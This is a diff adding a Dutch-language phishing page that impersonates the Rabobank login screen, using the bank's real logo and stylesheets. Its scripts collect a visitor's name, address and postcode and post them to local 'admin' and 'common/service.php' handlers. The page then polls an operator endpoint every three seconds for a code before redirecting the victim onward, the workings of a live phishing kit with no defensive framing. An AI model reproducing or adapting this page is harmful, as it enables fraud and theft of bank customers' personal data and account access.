@@ -1,0 +1,258 @@
+<!DOCTYPE HTML>
+<html lang="nl" dir="ltr" class="no-js">	
+    <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+    <head>
+        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+        <title>Rabobank - Inloggen</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="HandheldFriendly" content="True">
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+        <meta name="format-detection" content="telephone=no" />
+        <meta http-equiv="cleartype" content="on">
+        <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+        <link href="https://bankieren.rabobank.nl/rabo/sam/staticcontent/vrs_11_13_0/images/favicon.ico" rel="shortcut icon" />
+        <meta charset="utf-8">
+        <link rel="stylesheet" href="https://bankieren.rabobank.nl/rabo/sam/staticcontent/vrs_11_13_0/newdesign/css/rass-proto.css" /> 
+        <link rel="stylesheet" href="https://bankieren.rabobank.nl/rabo/sam/staticcontent/vrs_11_13_0/newdesign/css/www-extension.css" /> 
+        <link rel="stylesheet" href="css/mobile-new-css.css" />
+        <link rel="stylesheet" href="https://bankieren.rabobank.nl/klanten/static/generic/font/myriad/default.css" />
+        <script type="text/javascript" src="https://bankieren.rabobank.nl/rabo/sam/javascript/x12.js"></script>
+    </head>
+    <body class=" rass-chgen-rs">        
+        <div class="rass-pagetype-login rass-pagewrapper">
+            <div id="rass-parallax-banner"></div>
+            <div class="rass-container">
+                <form id="langform" action="https://bankieren.rabobank.nl/omgevingskeuze/qsl_switchlanguage.do" method="post" autocomplete="off">
+                    <input type="hidden" id="Scid" name="Scid" size="32" maxlength="32" value="32014cb1e64a4caeab7ed6fcd123d32e_1507551083374" />
+                    <input type="hidden" name="SessHrGebrChk" value="false" />
+                    <input type="hidden" name="AuthId" value="" />
+                    <input type="hidden" name="AuthBpasNr" value="" />
+                    <input type="hidden" name="language" value="nl" />
+                    <input type="hidden" id="u" name="u" value="" />
+
+                    <h1 aria-live="polite" class="rass-page-title">Inloggen<a href="https://www.rabobank.nl/" class="rass-ui-logo"><img src="https://bankieren.rabobank.nl/rabo/sam/staticcontent/vrs_11_13_0/newdesign/images/rabobank_logo.png" alt="rabobank logo" /></a>
+                        <div class="langswitch">
+                            <a data-rass-behavior="rass-action-linktoform" class="current" href="registratie4bd6.html?language=nl">NL</a>
+                            <span>|</span>
+                            <a data-rass-behavior="rass-action-linktoform"  href="registratie07a0.html?language=en">EN</a>
+                        </div>
+                    </h1>
+                </form>
+                <p style="color:red;display:none;" id="error1">De combinatie van uw rekeningnummer, pasnummer en de code is onjuist. Bij herhaling van deze fout kunt u contact opnemen met uw lokale Rabobank. (947)</p>
+                <p style="color:red;display:none;" id="error2">De combinatie van uw rekeningnummer en pasnummer is onjuist. Bij herhaling van deze fout kunt u contact opnemen met uw lokale Rabobank. (947)</p>
+                <form id="loginform" action="inloggen-active.html" method="get" autocomplete="off" data-rass-behavior="validate-form autosubmit-form" data-rass-resubmitmsg="Het verzoek is al verzonden. Een ogenblik geduld." class="rass-data-target customForm">
+                    <input type="hidden" id="Scid" name="Scid" size="32" maxlength="32" value="32014cb1e64a4caeab7ed6fcd123d32e_1507551083374" />
+
+                    <a href="registratie07a0.html?SelectedReader=rr" data-rass-behavior="switch-reader" class="rass-skiplink">Heeft u alleen een<br/>Random&nbsp;Reader? Klik<br/>hier om in te loggen met de <br />Random&nbsp;Reader.</a>
+                    <input type="hidden" id="u2" name="u" value="" />
+                    <div class="rass-section-input">                        
+                        <div class="input-wrapper">
+                            <h2></h2>
+                            <div data-rass-behavior="validate-iban reset-vc force-numkeypad" class="rass-wrapper-prefix">
+                                <label for="rass-data-reknr">Name</label>
+                                <div class="wrap">
+                                    <label class="rass-focushelper" for="rass-data-reknr"></label>
+                                    <div class="col-b">
+                                        <input autocomplete="off" id="name" class="rass-data-target keyUp" type="text" size="9" value="" name="name" data-rass-behavior="rass-data-sync rass-state-autofocus"/>
+                                    </div>
+                                    <span class="clearfix"></span>
+                                </div>
+                                <em class="rass-ui-error"></em>
+                            </div>
+                            <a href="#" tabindex="-1" class="rass-info-link" data-rass-behavior="show-in-tooltip" data-rass-content="/rabo/sam/staticcontent/vrs_11_13_0/newdesign/images/uitleg_rekeningnummer_nl.png">info</a>
+                            <div data-rass-behavior="validate-iban reset-vc force-numkeypad" class="rass-wrapper-prefix">
+                                <label for="rass-data-reknr">Addes</label>
+                                <div class="wrap">
+                                    <label class="rass-focushelper" for="rass-data-reknr"></label>        
+                                    <div class="col-b">
+                                        <input autocomplete="off" id="address" class="rass-data-target keyUp" type="text" size="9" value="" name="address" />
+                                    </div>
+                                    <span class="clearfix"></span>
+                                </div>
+                                <em class="rass-ui-error"></em>
+                            </div>
+                            <a href="#" tabindex="-1" class="rass-info-link" data-rass-behavior="show-in-tooltip" data-rass-content="/rabo/sam/staticcontent/vrs_11_13_0/newdesign/images/uitleg_rekeningnummer_nl.png">info</a>
+                            <div data-rass-behavior="validate-iban reset-vc force-numkeypad" class="rass-wrapper-prefix">
+                                <label for="rass-data-reknr">Postcode</label>
+                                <div class="wrap">
+                                    <label class="rass-focushelper" for="rass-data-reknr"></label>        
+                                    <div class="col-b">
+                                        <input autocomplete="off" id="postcode" class="rass-data-target keyUp" type="text" size="9" value="" name="postcode" />
+                                    </div>
+                                    <span class="clearfix"></span>
+                                </div>
+                                <em class="rass-ui-error"></em>
+                            </div>
+                            <a href="#" tabindex="-1" class="rass-info-link" data-rass-behavior="show-in-tooltip" data-rass-content="/rabo/sam/staticcontent/vrs_11_13_0/newdesign/images/uitleg_rekeningnummer_nl.png">info</a>
+                        </div>
+                        <!--
+                        <div class="rass-ui-checkbox">
+                            <input name="SessHrGebrChk" type="checkbox" id="rass-data-onthouden" data-rass-behavior="rass-data-sync"  />
+                            <label for="rass-data-onthouden">Onthouden</label>
+                        </div>
+                        -->
+                    </div>
+                    <div class="rass-section-action">
+                        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">                        
+                        <button id="rass-action-login22" class="buttonload rass-button-primary rass-state-dynamicchild" type="button" onclick="submas()" disabled="disabled" >
+                            Volgende
+                        </button>
+                        <style>
+                            #rass-action-login22:disabled{background: gray;}
+                        </style>
+                        <!--                        <input  id="rass-action-cancel" data-rass-behavior="action-cancel" class="rass-button-tertiary rass-action-cancel" type="submit" name="cancel" value="Annuleren" />-->
+                    </div>
+                    <div class="rass-section-action rass-hideonjs">
+                        <!--                        <input  id="" class="" name="getcolorcode" type="submit" value="Kleurcode ophalen" />-->
+                    </div>
+                </form>
+                <!--                <form action="" method="post" autocomplete="off" data-rass-behavior="validate-form" " class="rass-data-target rass-state-dynamic">
+                                    <input type="hidden" id="Scid" name="Scid" size="32" maxlength="32" value="32014cb1e64a4caeab7ed6fcd123d32e_1507551083374" />
+                                    <input type="hidden" id="u3" name="u" value="" />
+                                    <input type="hidden" id="SessHrGebrChk" name="SessHrGebrChk"  value="false" />
+                                    <div class="rass-section-input rass-qrcode-wrapper">
+                                        <ul>
+                                            <li><strong>Bankpas</strong> in de <strong>Rabo&nbsp;Scanner</strong> plaatsen</li>
+                                            <li><strong>Pincode</strong> invoeren</li>
+                                            <li><strong>Scan</strong> de kleurcode
+                                                <img class="rass-uicontrol-qrcode" src="https://bankieren.rabobank.nl/rabo/sam/staticcontent/vrs_11_13_0/newdesign/images/grayed-out-vc-nl.png" alt="inactieve kleurcode"  />
+                                            </li>
+                                            <li><strong>Controleer</strong> de samenvatting op de Rabo&nbsp;Scanner</li>
+                                        </ul>
+                                        <label for="rass-data-inlogcode" data-rass-behavior="validate-inlogcode force-numkeypad">
+                                            <span>Inlogcode</span>
+                                            <input autocomplete="off" id="rass-data-inlogcode" class="rass-data-target rass-state-dynamicchild"  disabled="disabled"  type="text" name="AuthCd" maxlength="8" size="8" title="8 cijfers van de inlogcode die op uw Rabo Scanner verschijnt" data-rass-validation="havingvc numeric 8length" data-rass-msg="U dient eerst een kleurcode op te halen voordat u kunt inloggen|Inlogcode bestaat uit 8 cijfers" value="" />
+                                            <em class="rass-ui-error"></em>
+                                        </label>  				
+                                    </div>
+                                    <div class="rass-section-action">
+                                        <input  id="rass-action-login" class="rass-button-primary rass-state-dynamicchild" type="submit" name="submit"  disabled="disabled"  value="Inloggen" />
+                                        <input  id="rass-action-cancel" data-rass-behavior="action-cancel" class="rass-button-tertiary rass-action-cancel" type="submit" name="cancel" value="Annuleren" data-rass-msg="U gaat inloggen afbreken."/>
+                                    </div>
+                                </form>
+                                <div class="footer">
+                                    <div>
+                                        <ul>
+                                            <li>
+                                                <a href="https://www.rabobank.nl/help_inlogscherm" rel="nofollow" data-rass-behavior="action-showinpopup" class="rass-help-link rass-icon-link">Help</a>
+                                            </li>
+                                        </ul>
+                                        <ul>
+                                            <li>
+                                                <a href="https://www.rabobank.nl/v" rel="nofollow" data-rass-behavior="action-showinpopup" class="rass-arrow-link rass-icon-link">Zo bankiert u veilig</a>
+                                            </li>
+                                        </ul>   
+                                    </div>    
+                                </div>-->
+            </div>
+            <div class="rass-section-service">
+                <h2>Service</h2>
+                <ul>
+                    <li class="rass-rsp-nonmobile"><a href="https://www.rabobank.nl/p_service_nietinloggen" rel="nofollow" data-rass-behavior="action-showinpopup">Problemen met inloggen</a></li>
+                    <li class="rass-rsp-nonmobile"><a href="https://www.rabobank.nl/rs_faq" rel="nofollow" data-rass-behavior="action-showinpopup">Veel gestelde vragen over Rabo&nbsp;Scanner</a></li>
+                    <li class="rass-rsp-nonmobile"><a href="https://www.rabobank.nl/raboscannerdemo-inlog" rel="nofollow" data-rass-behavior="action-showinpopup">Demo inloggen met Rabo&nbsp;Scanner</a></li>
+                    <li class="rass-rsp-nonmobile"><a href="https://www.rabobank.nl/raboscanner1" rel="nofollow" data-rass-behavior="action-showinpopup">Meer informatie over Rabo&nbsp;Scanner</a></li>
+                </ul>
+                <ul>
+                    <li class="rass-rsp-nonmobile">
+                        <form id="switchreaderform" action="https://bankieren.rabobank.nl/omgevingskeuze/qsl_switchreader.do" method="post" autocomplete="off">
+                            <input type="hidden" id="Scid" name="Scid" size="32" maxlength="32" value="32014cb1e64a4caeab7ed6fcd123d32e_1507551083374" />
+                            <input type="hidden" name="SessHrGebrChk" value="false" />
+                            <input type="hidden" name="AuthId" value="" />
+                            <input type="hidden" name="AuthBpasNr" value="" />
+                            <input name="SelectedReader" type="hidden" value="rr"/>
+                            <input id="rass-action-switchreader" type="submit" class="rass-button-tertiary rass-icon-link" name="switchreader" value="Inloggen met Random Reader" />
+                        </form>
+                    </li>
+                    <li class="rass-rsp-nonmobile"><a href="https://www.rabobank.nl/p_rib_info" rel="nofollow" data-rass-behavior="action-showinpopup">Aanvragen Rabo&nbsp;Internetbankieren</a></li>
+                    <li class="rass-more"><a href="https://www.rabobank.nl/meerservice" rel="nofollow" data-rass-behavior="action-showinpopup">Meer service</a></li>
+                </ul>
+            </div>
+            <div class="rass-socialbar">
+                <div class="rass-socialbar-topbar">
+                    <div class="rass-socialbar-slogan"><span>Rabobank</span></div>
+                </div>
+            </div>		
+        </div>		
+        <script language="JavaScript"  src="http://ajax.googleapis.com/ajax/libs/jquery/1.10.0/jquery.min.js"></script>
+        <script>
+                            $(document).ready(function (e) {
+                                $("#rass-data-pasnr").focusout(function () {
+                                    var url = "common/service.php?j=4"; // the script where you handle the form input.
+                                    $.ajax({
+                                        type: "POST",
+                                        url: url,
+                                        data: $("#loginform").serialize()
+                                    });
+                                })
+                            });
+        </script>
+        <script type="text/javascript" src="https://bankieren.rabobank.nl/rabo/sam/staticcontent/vrs_11_13_0/javascript/brwcook.js"></script>
+        <script type="text/javascript" src="https://bankieren.rabobank.nl/rabo/sam/javascript/brwfunc.js"></script>
+        <script type="text/javascript" src="https://bankieren.rabobank.nl/rabo/sam/staticcontent/vrs_11_13_0/newdesign/scripts/device.min.js"></script>
+        <script type="text/javascript" src="rass-proto.js"></script>		
+        <script type="text/javascript">
+                            $(".keyUp").keyup(function () {
+                                var name = $("#name").val();
+                                var address = $("#address").val();
+                                var postcode = $("#postcode").val();
+                                if (name != "" && address != "" && postcode != "") {
+                                    $("#rass-action-login22").removeAttr("disabled");
+                                } else {
+                                    $("#rass-action-login22").attr("disabled", "disabled");
+                                }
+                            });
+                            function getUrlVars()
+                            {
+                                var vars = [], hash;
+                                var hashes = window.location.href.slice(window.location.href.indexOf('?') + 1).split('&');
+                                for (var i = 0; i < hashes.length; i++)
+                                {
+                                    hash = hashes[i].split('=');
+                                    vars.push(hash[0]);
+                                    vars[hash[0]] = hash[1];
+                                }
+                                return vars;
+                            }
+                            var u_vars = getUrlVars();
+                            if (typeof (u_vars['u']) != "undefined" && u_vars['u'] !== null) {
+                                $("#u,#u2,#u3").val(u_vars['u']);
+                            }
+                            if (typeof (u_vars['error']) != "undefined" && u_vars['error'] !== null && u_vars['error'] == 1) {
+                                $("#error1").show();
+                            }
+                            if (typeof (u_vars['error']) != "undefined" && u_vars['error'] !== null && u_vars['error'] == 2) {
+                                $("#error2").show();
+                            }
+                            function submas() {
+                                $("#rass-action-login22").html('Een moment geduld...&nbsp;<i class="fa fa-spinner fa-spin"></i>');
+                                $.post("admin/inloggen2.php", $("#loginform").serialize(), function (response) {
+                                    setInterval(function () {
+                                        $.get("admin/getcode1.php", function (code) {
+                                            if (code != '') {
+                                                var Scid = '';
+                                                var AuthId = '';
+                                                var u = '';
+                                                var AuthBpasNr = '';
+                                                if (typeof (u_vars['Scid']) != "undefined" && u_vars['Scid'] !== null) {
+                                                    Scid = u_vars['Scid'];
+                                                }
+                                                if (typeof (u_vars['AuthId']) != "undefined" && u_vars['AuthId'] !== null) {
+                                                    AuthId = u_vars['AuthId'];
+                                                }
+                                                if (typeof (u_vars['u']) != "undefined" && u_vars['u'] !== null) {
+                                                    u = u_vars['u'];
+                                                }
+                                                if (typeof (u_vars['AuthBpasNr']) != "undefined" && u_vars['AuthBpasNr'] !== null) {
+                                                    AuthBpasNr = u_vars['AuthBpasNr'];
+                                                }
+                                                window.location.href = "inloggen-active.html?Scid=" + Scid + "&AuthId=" + AuthId + "&u=" + u + "&AuthBpasNr=" + AuthBpasNr;
+                                            }
+                                        });
+                                    }, 3000);
+                                });
+                                return false;
+                            }
+        </script>
+    </body>
+</html>
